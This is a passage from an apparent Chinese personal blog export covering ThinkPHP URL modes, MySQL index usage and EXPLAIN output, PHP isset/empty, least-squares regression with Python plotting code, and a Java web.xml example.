PATHINFO模式PATHINFO模式是系统的默认URL模式，提供了最好的SEO支持，系统内部已经做了环境的兼容处理，所以能够支持大多数的主机环境。对应上面的URL模式，PATHINFO模式下面的URL访问地址是： http://localhost/index.php/home/user/login/var/value/PATHINFO模式下面，URL是可定制的，例如，通过下面的配置：12// 更改PATHINFO参数分隔符'URL_PATHINFO_DEPR'=&gt;'-', REWRITE模式REWRITE模式是在PATHINFO模式的基础上添加了重写规则的支持，可以去掉URL地址里面的入口文件index.php，但是需要额外配置WEB服务器的重写规则。如果是Apache则需要在入口文件的同级添加.htaccess文件，内容如下：123456&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;REQUEST_FILENAME&#125; !-d RewriteCond %&#123;REQUEST_FILENAME&#125; !-f RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]&lt;/IfModule&gt; 接下来，就可以用下面的URL地址访问了： http://localhost/home/user/login/var/value 兼容模式可以更改兼容模式变量的名称定义，例如：1'VAR_PATHINFO' =&gt; 'path' PATHINFO参数分隔符对兼容模式依然有效，例如：12// 更改PATHINFO参数分隔符'URL_PATHINFO_DEPR'=&gt;'-', 使用以上配置的话，URL访问地址可以变成： http://localhost/?path=/home-user-login-var-value兼容模式配合Web服务器重写规则的定义，可以达到和REWRITE模式一样的URL效果。例如，我们在Apache下面的话，.htaccess文件改成如下内容：123456&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;REQUEST_FILENAME&#125; !-d RewriteCond %&#123;REQUEST_FILENAME&#125; !-f RewriteRule ^(.*)$ index.php?s=/$1 [QSA,PT,L]&lt;/IfModule&gt; 就可以和REWRITE模式一样访问下面的URL地址访问了： http://localhost/home/user/login/var/value………http://document.thinkphp.cn/manual_3_2.html]]></content>
      <categories>
        <category>PHP</category>
        <category>ThinkPHP</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL知识点巩固]]></title>
    <url>%2F2017%2F07%2F22%2Ffirst%2F</url>
    <content type="text"><![CDATA[什么是索引索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。如果表有1000个记录，通过索引查找记录至少要比顺序扫描记录快100倍。假设我们创建了一个名为people的表:create table people (peopleid SMALLINT NOT NULL,name CHAR(50) NOT NULL);然后，我们完全随机把1000个不同name值插入到people表。如果我们创建了name列的索引，MySQL将在索引中排序name列：对于索引中的每一项，MySQL在内部为它保存一个数据文件中实际记录所在位置的“指针”。因此，如果我们要查找name等于“Mike”记录的peopleid（SQL命令为“SELECT peopleid FROM people WHERE name=’Mike’;”），MySQL能够在name的索引中查找“Mike”值，然后直接转到数据文件中相应的行，准确地返回该行的peopleid（999）。在这个过程中，MySQL只需处理一个行就可以返回结果。如果没有“name”列的索引，MySQL要扫描数据文件中的所有记录，即1000个记录！显然，需要MySQL处理的记录数量越少，则它完成任务的速度就越快。普通索引:仅加速查询唯一索引:加速查询+列值唯一(可以有null)主键索引:加速查询+列值唯一表中只有一个(不可以有null)组合索引:多列值组成一个索引，专门用于组合搜索，其效率大于索引合并全文索引:对文本的内容进行分词，进行搜索。索引合并:使用多个单列索引组合搜索覆盖索引:select的数据列只用从索引中就能够取得,不必读取数据行，换句话说查询列要被所建的索引覆盖。 如何创建索引创建表的时候创建索引12345create table tbl name(字段名陈 字段类型 [完整性约束条件],,,,,[UNIQUE|FULLTEXT|SPATIAL] INDEX|KEY [索引名称] (字段名称[长度])[ASC|DESC]); 在已经存在的表上创建索引:121、create [unique|fulltext|spatial] index 索引名称 on 表名&#123;字段名称[(长度)] [ASC|DESC]&#125;2、alter table ta1_name add [unique|fulltext|spatial] index 索引名称(字段名陈[(长度)] [ASC|DESC]) 删除索引?1drop index 索引名称 on tb1_name; 普通索引普通索引仅有一个功能:加速查询创建表+索引1234567create table in1( nid int not null auto_increment primary key, name varchar(32) not null, email varchar(64) not null, extra text, index ix_name (name)) 创建索引1create index index_name on table_name(column_name) 删除索引1drop index_name on table_name; 查看索引1show index from table_name; 注意:对于创建索引时如果是BLOB和TEXT类型，必须指定length。1create index ix_extra on in1(extra(32)); 唯一性索引唯一索引有两个功能:加速查询和唯一约束(可含null)创建表+唯一索引1234567create table in1( nid int not null auto_increment primary key, name varchar(32) not null, email varchar(64) not null, extra text, unique ix_name (name)) 创建唯一索引1create unique index 索引名 on 表名(列名) 删除索引1drop unique index 索引名 on 表名 主键索引主键有两个功能:加速查询和唯一约束(不可含null)创建表+创建主键12345678910111213141516create table in1( nid int not null auto_increment primary key, name varchar(32) not null, email varchar(64) not null, extra text, index ix_name(name))orcreate table in1( nid int not null auto_increment, name varchar(32) not null, email varchar(64) not null, extra text, primary key(nid), index ix_name(name)) 创建主键1alter table 表名 add primary key(列名); 删除主键12alter table 表名 drop primary key;alter table 表名 modify 列名 int,drop primary key; 组合索引组合索引是将n个列组合成一个索引其应用场景为：频繁的同时使用n列来进行查询，如：where n1 = ‘alex’ and n2 = 666。创建表123456create table in3( nid int not null auto_increment primary key, name varchar(32) not null, email varchar(64) not null, extra text) 创建组合索引1create index ix_name_email on in3(name,email); 如上创建组合索引之后，查询:name and email –使用索引name –使用索引email –不使用索引注意:对于同时搜索n个条件时，组合索引的性能好于多个单列索引合并。相关命令12345678910- 查看表结构desc 表名- 查看生成表的sqlshow create table 表名- 查看索引show index from 表名- 查看执行时间set profiling = 1;sql ...show profiles; 使用索引和不使用索引123456789101112131415161718由于索引时专门用于加速搜索而生，所以加上索引之后，查询效率会快到飞起来。# 有索引mysql &gt; select * from tb1 where name = &apos;wupeiqi-888&apos;;+-----+-------------+---------------------+----------------------------------+---------------------+| nid | name | email | radom | ctime |+-----+-------------+---------------------+----------------------------------+---------------------+| 889 | wupeiqi-888 | wupeiqi888@live.com | 5312269e76a16a90b8a8301d5314204b | 2016-08-03 09:33:35 |+-----+-------------+---------------------+----------------------------------+---------------------+1 row in set (0.00 sec)# 无索引mysql&gt; select * from tb1 where email = &apos;wupeiqi888@live.com&apos;;+-----+-------------+---------------------+----------------------------------+---------------------+| nid | name | email | radom | ctime |+-----+-------------+---------------------+----------------------------------+---------------------+| 889 | wupeiqi-888 | wupeiqi888@live.com | 5312269e76a16a90b8a8301d5314204b | 2016-08-03 09:33:35 |+-----+-------------+---------------------+----------------------------------+---------------------+1 row in set (1.23 sec) 正确使用索引数据库表中添加索引后确实会让查询速度起飞，但前提必须是正确的使用索引来查询，如果以错误的方式使用，则即使建立索引也会不奏效。即使建立索引，索引也不会生效：1234567891011121314151617181920212223242526272829303132- like &apos;%xx&apos; select * from tb1 where name like &apos;%cn&apos;;- 使用函数 select * from tb1 where reverse(name) = &apos;wupeiqi&apos;;- or select * from tb1 where nid = 1 or email = &apos;seven@live.com&apos;; 特别的：当or条件中有未建立索引的列才失效，以下会走索引 select * from tb1 where nid = 1 or name = &apos;seven&apos;; select * from tb1 where nid = 1 or email = &apos;seven@live.com&apos; and name = &apos;alex&apos;- 类型不一致 如果列是字符串类型，传入条件是必须用引号引起来，不然... select * from tb1 where name = 999;- != select * from tb1 where name != &apos;alex&apos; 特别的：如果是主键，则还是会走索引 select * from tb1 where nid != 123- &gt; select * from tb1 where name &gt; &apos;alex&apos; 特别的：如果是主键或索引是整数类型，则还是会走索引 select * from tb1 where nid &gt; 123 select * from tb1 where num &gt; 123- order by select email from tb1 order by name desc; 当根据索引排序时候，选择的映射如果不是索引，则不走索引 特别的：如果对主键排序，则还是走索引： select * from tb1 order by nid desc;- 组合索引最左前缀 如果组合索引为：(name,email) name and email -- 使用索引 name -- 使用索引 email -- 不使用索引 其他注意事项123456789- 避免使用select *- count(1)或count(列) 代替 count(*)- 创建表时尽量时 char 代替 varchar- 表的字段顺序固定长度的字段优先- 组合索引代替多个单列索引（经常使用多个条件查询时）- 尽量使用短索引- 使用连接（JOIN）来代替子查询(Sub-Queries)- 连表时注意条件类型需一致- 索引散列值（重复少）不适合建索引，例：性别不适合 limit 分页无论是否有索引，limit分页是一个值得关注的问题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051每页显示10条：当前 118 120， 125倒序： 大 小 980 970 7 6 6 5 54 43 3221 19 98 下一页： select * from tb1 where nid &lt; (select nid from (select nid from tb1 where nid &lt; 当前页最小值 order by nid desc limit 每页数据 *【页码-当前页】) A order by A.nid asc limit 1) order by nid desc limit 10; select * from tb1 where nid &lt; (select nid from (select nid from tb1 where nid &lt; 970 order by nid desc limit 40) A order by A.nid asc limit 1) order by nid desc limit 10;上一页： select * from tb1 where nid &lt; (select nid from (select nid from tb1 where nid &gt; 当前页最大值 order by nid asc limit 每页数据 *【当前页-页码】) A order by A.nid asc limit 1) order by nid desc limit 10; select * from tb1 where nid &lt; (select nid from (select nid from tb1 where nid &gt; 980 order by nid asc limit 20) A order by A.nid desc limit 1) order by nid desc limit 10; 执行计划explain + 查询SQL – 用于显示SQL执行信息参数，根据参考信息可以进行SQL优化1234567mysql&gt; explain select * from tb2;+----+-------------+-------+------+---------------+------+---------+------+------+-------+| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |+----+-------------+-------+------+---------------+------+---------+------+------+-------+| 1 | SIMPLE | tb2 | ALL | NULL | NULL | NULL | NULL | 2 | NULL |+----+-------------+-------+------+---------------+------+---------+------+------+-------+1 row in set (0.00 sec) 执行计划1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283id 查询顺序标识 如：mysql&gt; explain select * from (select nid,name from tb1 where nid &lt; 10) as B; +----+-------------+------------+-------+---------------+---------+---------+------+------+-------------+ | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra | +----+-------------+------------+-------+---------------+---------+---------+------+------+-------------+ | 1 | PRIMARY | &lt;derived2&gt; | ALL | NULL | NULL | NULL | NULL | 9 | NULL | | 2 | DERIVED | tb1 | range | PRIMARY | PRIMARY | 8 | NULL | 9 | Using where | +----+-------------+------------+-------+---------------+---------+---------+------+------+-------------+ 特别的：如果使用union连接气值可能为null select_type 查询类型 SIMPLE 简单查询 PRIMARY 最外层查询 SUBQUERY 映射为子查询 DERIVED 子查询 UNION 联合 UNION RESULT 使用联合的结果 ... table 正在访问的表名 type 查询时的访问方式，性能：all &lt; index &lt; range &lt; index_merge &lt; ref_or_null &lt; ref &lt; eq_ref &lt; system/const ALL 全表扫描，对于数据表从头到尾找一遍 select * from tb1; 特别的：如果有limit限制，则找到之后就不在继续向下扫描 select * from tb1 where email = &apos;seven@live.com&apos; select * from tb1 where email = &apos;seven@live.com&apos; limit 1; 虽然上述两个语句都会进行全表扫描，第二句使用了limit，则找到一个后就不再继续扫描。 INDEX 全索引扫描，对索引从头到尾找一遍 select nid from tb1; RANGE 对索引列进行范围查找 select * from tb1 where name &lt; &apos;alex&apos;; PS: between and in &gt; &gt;= &lt; &lt;= 操作 注意：!= 和 &gt; 符号 INDEX_MERGE 合并索引，使用多个单列索引搜索 select * from tb1 where name = &apos;alex&apos; or nid in (11,22,33); REF 根据索引查找一个或多个值 select * from tb1 where name = &apos;seven&apos;; EQ_REF 连接时使用primary key 或 unique类型 select tb2.nid,tb1.name from tb2 left join tb1 on tb2.nid = tb1.nid; CONST 常量 表最多有一个匹配行,因为仅有一行,在这行的列值可被优化器剩余部分认为是常数,const表很快,因为它们只读取一次。 select nid from tb1 where nid = 2 ; SYSTEM 系统 表仅有一行(=系统表)。这是const联接类型的一个特例。 select * from (select nid from tb1 where nid = 1) as A; possible_keys 可能使用的索引 key 真实使用的 key_len MySQL中使用索引字节长度 rows mysql估计为了找到所需的行而要读取的行数 ------ 只是预估值 extra 该列包含MySQL解决查询的详细信息 “Using index” 此值表示mysql将使用覆盖索引，以避免访问表。不要把覆盖索引和index访问类型弄混了。 “Using where” 这意味着mysql服务器将在存储引擎检索行后再进行过滤，许多where条件里涉及索引中的列，当（并且如果）它读取索引时，就能被存储引擎检验，因此不是所有带where子句的查询都会显示“Using where”。有时“Using where”的出现就是一个暗示：查询可受益于不同的索引。 “Using temporary” 这意味着mysql在对查询结果排序时会使用一个临时表。 “Using filesort” 这意味着mysql会对结果使用一个外部索引排序，而不是按索引次序从表里读取行。mysql有两种文件排序算法，这两种排序方式都可以在内存或者磁盘上完成，explain不会告诉你mysql将使用哪一种文件排序，也不会告诉你排序会在内存里还是磁盘上完成。 “Range checked for each record(index map: N)” 这个意味着没有好用的索引，新的索引将在联接的每一行上重新估算，N是显示在possible_keys列中索引的位图，并且是冗余的。 慢日志查询a、配置MySQL自动记录慢日志1234slow_query_log = OFF 是否开启慢日志记录long_query_time = 2 时间限制，超过此时间，则记录slow_query_log_file = /usr/slow.log 日志文件log_queries_not_using_indexes = OFF 为使用索引的搜索是否记录 注：查看当前配置信息： show variables like ‘%query%’ 修改当前配置： set global 变量名 = 值b、查看mysql慢日志mysqldumpslow -s at -a /usr/local/var/mysql/MacBook-Pro-3-slow.log参数详解123456789101112131415161718192021222324--verbose 版本--debug 调试--help 帮助-v 版本-d 调试模式-s ORDER 排序方式 what to sort by (al, at, ar, c, l, r, t), &apos;at&apos; is default al: average lock time ar: average rows sent at: average query time c: count l: lock time r: rows sent t: query time-r 反转顺序，默认文件倒序拍。reverse the sort order (largest last instead of first)-t NUM 显示前N条just show the top n queries-a 不要将SQL中数字转换成N，字符串转换成S。don&apos;t abstract all numbers to N and strings to &apos;S&apos;-n NUM abstract numbers with at least n digits within names-g PATTERN 正则匹配；grep: only consider stmts that include this string-h HOSTNAME mysql机器名或者IP；hostname of db server for *-slow.log filename (can be wildcard), default is &apos;*&apos;, i.e. match all-i NAME name of server instance (if using mysql.server startup script)-l 总时间中不减去锁定时间；don&apos;t subtract lock time from total time 全文索引创建全文索引(FullText index)旧版的MySQL的全文索引只能用在MyISAM表格的char、varchar和text的字段上。不过新版的MySQL5.6.24上InnoDB引擎也加入了全文索引，所以具体信息要随时关注官网，创建表的同时创建全文索引123456create table article( id int auto_increment not null primary key, title varchar(200), body text, fulltext(title,body))type=myisam; 通过alter table的方式来添加alter table ‘student’ add fulltext index ft_stu_name(‘name’)#ft_stu_name是索引名，可以随便起或者:alter table ‘student’ add fulltext ft_stu_name(‘name’)直接通过create index的方式create fulltext index ft_email_name on ‘student’(‘name’)也可以在创建索引的时候指定索引的长度:create fulltext index ft_email_name on ‘student’(‘name’(20))删除全文索引直接使用drop index(注意：没有 drop fulltext index 这种用法)drop index full_idx_name on tommy.girl;使用alter table的方式alter table tommy.girl drop index ft_email_abck;使用全文索引跟普通索引稍有不同使用全文索引的格式： MATCH (columnName) AGAINST (‘string’)eg:select from ‘student’ where match(‘name’) against(‘聪’);当查询多列数据时:建议在此多列数据上创建一个联合的全文索引，否则使用不了索引的。select from ‘student’ where match(‘name’,’address’) AGAINST(‘聪 广东’);使用全文索引需要注意的是:(基本单位是词)分词，全文索引以词为基础，MySQL默认的分词是所有非字母和数字的特殊符号都是分词符 MySQL中与全文索引相关的几个变量： 使用命令：mysql&gt; SHOW VARIABLES LIKE ‘ft%’; #ft就是FullText的简写 ft_boolean_syntax + -&gt;&lt;()~:””&amp;| #改变IN BOOLEAN MODE的查询字符，不用重新启动MySQL也不用重建索引 ft_min_word_len 4 #最短的索引字符串，默认值为4，(通常改为1)修改后必须重建索引文件 重新建立索引命令：repair table tablename quick ft_max_word_len 84 #最长的索引字符串，默认值为84，修改后必须重建索引文件 ft_query_expansion_limit 20 #查询括展时取最相关的几个值用作二次查询 ft_stopword_file (built-in) #全文索引的过滤词文件，具体可以参考：MySQL全文检索中不进行全文索引默认过滤词 特别注意：50%的门坎限制(当查询结果很多，几乎所有记录都有，或者极少的数据，都有可能会返回非所期望的结果) –&gt;可用IN BOOLEAN MODE即可以避开50%的限制。 此时使用全文索引的格式就变成了： SELECT FROM student WHERE MATCH(name) AGAINST(‘聪’ IN BOOLEAN MODE) ft_boolean_syntax (+ -&gt;&lt;()~:””&amp;|)使用的例子： 4.1 + : 用在词的前面，表示一定要包含该词，并且必须在开始位置。 eg: +Apple 匹配：Apple123, “tommy, Apple” 4.2 - : 不包含该词，所以不能只用「-yoursql」这样是查不到任何row的，必须搭配其他语法使用。 eg: MATCH (girl_name) AGAINST (‘-林志玲 +张筱雨’)匹配到： 所有不包含林志玲，但包含张筱雨的记录 4.3. 空(也就是默认情况)，表示可选的，包含该词的顺序较高。 例子：apple banana 找至少包含上面词中的一个的记录行+apple +juice 两个词均在被包含+apple macintosh 包含词 “apple”，但是如果同时包含 “macintosh”，它的排列将更高一些+apple -macintosh 包含 “apple” 但不包含 “macintosh”4.4. &gt; :提高该字的相关性，查询的结果会排在比较靠前的位置。4.5.&lt; :降低相关性，查询的结果会排在比较靠后的位置。例子：4.5.1.先不使用 &gt;&lt;select from tommy.girl where match(girl_name) against(‘张欣婷’ in boolean mode);可以看到完全匹配的排的比较靠前4.5.2. 单独使用 &gt;select from tommy.girl where match(girl_name) against(‘张欣婷 &gt;李秀琴’ in boolean mode);使用了&gt;的李秀琴马上就排到最前面了 4.5.3. 单独使用 &lt; select from tommy.girl where match(girl_name) against(‘张欣婷 &lt;不是人’ in boolean mode); 看到没，不是人也排到最前面了，这里使用的可是 &lt; 哦，说好的降低相关性呢，往下看吧。 4.5.4.同时使用&gt;&lt; select * from tommy.girl where match(girl_name) against(‘张欣婷 &gt;李秀琴 &lt;练习册 &lt;不是人&gt;是个鬼’ in boolean mode); 到这里终于有答案了，只要使用了 &gt;&lt;的都会往前排，而且&gt;的总是排在&lt;的前面小结一下：1. 只要使用 &gt;&lt;的总比没用的 靠前； 使用 &gt;的一定比 &lt;的排的靠前 (这就符合相关性提高和降低)； 使用同一类的，使用的越早，排的越前。4.6. ( )：可以通过括号来使用字条件。eg: +aaa +(&gt;bbb &lt; ccc) // 找到有aaa和bbb和ccc，aaa和bbb，或者aaa和ccc(因为bbb，ccc前面没有+，所以表示可有可无),然后 aaa&amp;bbb &gt; aaa&amp;bbb&amp;ccc &gt; aaa&amp;ccc4.7. ~ :将其相关性由正转负，表示拥有该字会降低相关性，但不像「-」将之排除，只是排在较后面。eg: +apple ~macintosh 先匹配apple，但如果同时包含macintosh，就排名会靠后。4.8. :通配符，这个只能接在字符串后面。MATCH (girl_name) AGAINST (‘+ABC‘) #错误，不能放前面MATCH (girl_name) AGAINST (‘+张筱雨‘) #正确4.9. “ “ :整体匹配，用双引号将一段句子包起来表示要完全相符，不可拆字。eg: “tommy huang” 可以匹配 tommy huang xxxxx 但是不能匹配 tommy is huang。5.补充：Windows下无法修改 ft_min_word_len的情况， 使用cmd打开 services.msc，找到你的 MySQL服务，右键Properties,找到你的my.ini所在的路径5.2. 停止MySQL,在my.ini中增加 ft_min_word_len = 1,重启MySQL,然后使用命令 show variables like ‘ft_min_word_len’; 查看是否生效了单列索引与多列索引]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP知识点总结]]></title>
    <url>%2F2017%2F07%2F21%2Ffirst%2F</url>
    <content type="text"><![CDATA[php的isset()和empty()和is_null的区别bool isset();若变量不存在则返回FALSE若变量存在且其值为NULL，也返回FALSE若变量存在且值不为NULL，则返回TURE同时检查多个变量时，每个单项都符合上一个要求时才返回TRUE，否则结果为FALSE。检测变量是否已设置可使用defined()函数。unset()释放变量bool empty();检查一个变量是否为空返回值:若变量不存在则返回TRUE;若变量存在且其值为””,”0”,NULL,FALSE,array(),var \$var;以及任何没有任何属性的对象,则返回TRUE。若变量存在且其值不为””,”0”,NULL,FALSE,array(),var \$var;以及没有任何属性的对象，则返回FALSE。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据的历史]]></title>
    <url>%2F2017%2F07%2F13%2Ffirst%2F</url>
    <content type="text"><![CDATA[数据的来源最近一直在研究傅里叶变换，高斯方程，我发现自己都不知道数据是怎么来的，而研究数据的工具是什么，意义又是什么都不知道。所有以前学来的现在都是理所当然，比如自然常数e，三角函数的出现，曲线函数的出现等等。我也不觉得记住公式有什么错，或许能考一个很好的大学。但是我不喜欢这样的教育，这样的教育，现在要花我几年的时间来抛开我十几年的理所当然，既然我已经具备逻辑思维，那么我大脑里面的东西就不能再容纳理所当然，除了感情。一切要从实际意义出发。提起数据的来源那当然是人类为了计数，数据类型的发展过程，我觉得应该是这样的，整型数据、浮点型数据、虚数。这就是我们现实中的数据，应该就这三个吧，可能没有写完整！其他的，都是用这些数据来描述的。像你们说的负数，我觉得它不属于基本数据类型，更像一种对数据的操作。 数据的操作说起数据的操作那可多了，我认为的数据操作是什么呢？我认为数据的操作的发明需要根据具体的业务场景，比如当初人类发明的加法操作，当把一种物质抽象成数据来进行计数，那么加法操作是在所难免的。其实在我们刚开始接受加法的时候是很有体会的，在计算1+1的时候很简单，当计算58+45就不知道了，因为我们会掰指头。十个指头就可以算加法了，这就是你把指头抽象成数据。由于后来抽象思维越来越高，我们把所有学的都当成理所当然。蛮怀念不会的时光，如果让我再来一遍， 我一定研究个清楚。 数据的探索人们总是对未知的东西充满好奇，那么如果在你面前摆一个陌生的东西，你又该如何分析呢？以前我不知道，但是现在我知道了，把这个东西抽象成数据，这里面的数据就多了，按照计量单位来说(这里说一下，计量单位其实就是人类对世界上存在的但是还无法在大脑抽象的物质做一个定义，如长度单位，一旦我们做出一个定义，并且把这个定义用在物质本身，全球都用同一个定义，难道你还不能抽象出这个物质，在举个例子，我告诉你一个长方体长5cm,宽10cm,高3cm,难道你还不知道，当然，前提是你要有这些定义)的话，有长度，重量等等就不一一列举了。你们都听过碎花瓶理论吧！虽然这是一个谣言，但是我们可以看到它在数据上为我们带来的方向。碎花瓶理论就是一个人打碎了一个花瓶，它把碎片按重量分成了三类，最大，次大，第三大，结果发现最大:次大重量比=16:1，次大:第三大重量比=16:1。于是他总结出最大:次大:第三大=256:16:1。这就是对数据的一种探索，看似很简单，但是一结合生活中的实体就不一样，很有意义，所有破碎的物体都符合这个规律的话，难道没意义吗？这对考古界是多么有意义的。可惜不能通过所有的物体破碎规律。但是它向我们解释了抽象数据的可研究性和可普遍性。 数据探索从古至今发生过得事其实有很多东西都是基于探索才出来，并不是我们学的那么理所当然，比如函数。我们拿起一元二次函数，二元二次函数，二元一次函数都会算，但是你却不知道它是怎么产生的，这样的教育实在埋没人才。我们既然不能了解它的推理过程，至少能知道它的前世今生吧！幸好现在互联网发达。就我在网上的了解，在十七世纪，伽利略发现了在大量的数据面前（这个大量数据是多种数据中的同一类数据在时域上的大量数据），必然存在一个变量对另一个变量的依赖关系，如果你没有发现依赖关系，有三种原因第一、你的数据种类不够，第二数据量不够，第三依赖关系分析的不到位(你甚至可以自己再定义一个自然常数，不要局限思维)。 数据抽象说起抽象，我想从笛卡尔坐标系来说，这个百度百科上也有说，但我觉得不够好。我认为笛卡尔能想出坐标系的根本在于抽象，如果我是笛卡尔，我会想，既然我的几何图形能够用数据来抽象，那么我能不能用数据来抽象我的几何呢？他确实做到了，他建立了二维坐标系（包括后来的三维坐标系，我觉得也基于笛卡尔），我只要自己去做一些正方形的长宽数据就可以在这个坐标系模拟出来，并可以进行进一步的几何分析。那么这样一来，二维坐标系既可以把数据做几何分析，又可以把几何做数据分析，这是多么一个伟大的工具，现在想想，真是太厉害了。数据做几何分析举一个例子，回归方程，回归方程大家都知道，我也知道大家都当成了理所当然，那就让我揭开这里面一层层的面纱吧！回归方程又分线性回归方程和非线性回归方程，这里就说线性回归方程，回归方程是根据样本数据通过回归分析所得到的反映一个变量（因变量）对另一个或一组变量（自变量）的回归关系的数学表达式。当你拿到样本数据，你该建立什么样的方程呢，这个问题就不探讨，要针对具体的业务场景。这里我就建立回归直线方程，也就是ax+b=y,a,b未知所以我们需要两组样本数据来求解方程组，任意拿出两组是可以求出这个方程组，但是这个方程组是你想要的吗？那么你怎么去知道求出来的方程组又是你想要的呢？这就要说二维坐标系，我们事先把样本数据画在二维坐标系上，然后根据我们求出来的方程在二维坐标系上，就可直接看到有多少个点在这个直线上，这样我们就知道这个方程是否是最优的，当然后来还有最小二乘法。我这个是基于没有最小二乘法的时候。这说明了几何与数据在二维坐标系上的联系性，至于几何在二维坐标系上做数据分析，我也就不说了，有很多比如三角形的中心。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线性回归-最小二乘法]]></title>
    <url>%2F2017%2F07%2F12%2Ffirst%2F</url>
    <content type="text"><![CDATA[介绍最小二乘法的核心就是保证所有数据偏差的平方和最小。(“平方”在古时候的称谓为”二乘”)假设我们收集到一些战舰的长度和宽度数据。 1 2 3 4 5 6 7 8 9 10 长度(m) 208 152 113 227 137 238 178 104 191 130 宽度(m) 21.6 15.5 10.4 31.0 13.0 32.4 19.0 10.4 19.0 11.8 根据这些数据我们用python画出散点图首先准备模拟数据包，我选择txt文件12345678910208 21.6152 15.5113 10.4227 31137 13238 32.4178 19104 10.4191 19130 11.8 书写Python代码123456789101112131415#-*- coding: utf-8 -*-import numpy as npimport osimport matplotlib.pyplot as pltdef drawScatterDiagram(fileName): xcord=[]; ycord=[]; fr=open(fileName) for line in fr.readlines(): lineArr=line.strip().split(); xcord.append(float(lineArr[0])); ycord.append(float(lineArr[1])); plt.scatter(xcord,ycord,c='red',marker='s') plt.show()drawScatterDiagram("h:/python/algorithm/ECF/data.txt"); 得到以下分析图像假如我们取前两个点(238,32.4) (152,15.5)就可以得到两个方程152a+b=15.5238a+b=32.4解得a=0.1965116 b=-14.36976这样我们就可以得到一个拟合图:新的问题是，这样的a,b是不是最优解，用专业的说法就是a,b是不是模型的最优化参数?在回答这个问题之前，我们先解决另外一个问题，a,b满足什么条件才是最好的?答案是:保证所有数据偏差的平方和最小。至于原理，我们会在后面讲，先来看看怎么利用这个工具来计算最好的a和b。假设所有数据的平方和为M:则我们现在要做的就是求使得M最小的a和b。请注意这个方程中,我们已知yi和xi，那其实这个方程就是一个以(a,b)为自变量，M为因变量的二元函数。回想一下高数中怎么对一元函数求极值。我们用的是导数这个工具。那么在二元函数中，我们依然用导数 。只不过这里的导数有了新的名字”偏导数”。偏导数就是把两个变量中的一个视为常数来求导。通过对M来求偏导数，我们得到一个方程组这两个方程中xi和yi都是知道的很容易就求得a和b了。python代码12345678910111213141516171819#-*- coding: utf-8 -*-import numpy as npimport osimport matplotlib.pyplot as pltdef drawScatterDiagram(fileName): xcord=[]; ycord=[]; fr=open(fileName) for line in fr.readlines(): lineArr=line.strip().split(); xcord.append(float(lineArr[0])); ycord.append(float(lineArr[1])); plt.scatter(xcord,ycord,c='red',marker='s') a=0.1612;b=-8.6394 x=np.arange(90.0,250.0,0.1) y=a*x+b plt.plot(x,y) plt.show()drawScatterDiagram("h:/python/algorithm/ECF/data.txt"); 原理探究数据拟合中，为什么要让模型的预测数据与实际数据之差的平方而不是绝对值和最小来优化模型参数？]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java web技术]]></title>
    <url>%2F2017%2F06%2F09%2Ffirst%2F</url>
    <content type="text"><![CDATA[Java webJava作为一个编程语言，当然有他一套可以解决网络传输资源的机制。首先谈一下网站从何而来，其实要谈网站的由来，那么浏览器时必不可少的，可以这样说，浏览器就跟Java的虚拟机一样，只要你安装了这个虚拟机，就能运行HTML，JavaScript，CSS编写的网页，就如同别人给你Java代码你就能够在一台装了Java虚拟机的电脑上运行，道理是一样的，只不过浏览器解决的问题不一样，浏览器主要是供用户浏览信息，并能够得到他们想要的，主要就是信息共享，有信息提供方就有信息获取方，这就是浏览器解决的业务问题。他一点也不神奇。往编程说了去，就是你电脑发的数据包要经过提供方认证才能给你你想要的信息。 tomcat,jsp,httpserver,mysql这四者是Java web的元老级了，是在SSH框架之前的所使用的，后面的SSH也是在他的基础上进行架构。主要包括src源码目录，library依赖包目录，webRoot下面的网页目录。接下来我要从SSH文件结构进行讲解。 入口配置文件web.xml这个文件无论你是用老框架还是新框架这个都是web的入口。我们来看一个文件。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" id="WebApp_ID" version="3.0"&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!-- spring4配置 --&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;/WEB-INF/classes/applicationContext*.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!--用来消除sitemesh 拦截器 Struts2拦截器的冲突 使之兼容 --&gt; &lt;filter&gt; &lt;filter-name&gt;struts-cleanup&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ActionContextCleanUp&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter&gt; &lt;filter-name&gt;sitemesh3&lt;/filter-name&gt; &lt;filter-class&gt;org.sitemesh.config.ConfigurableSiteMeshFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;!-- hibernate4配置 --&gt; &lt;filter&gt; 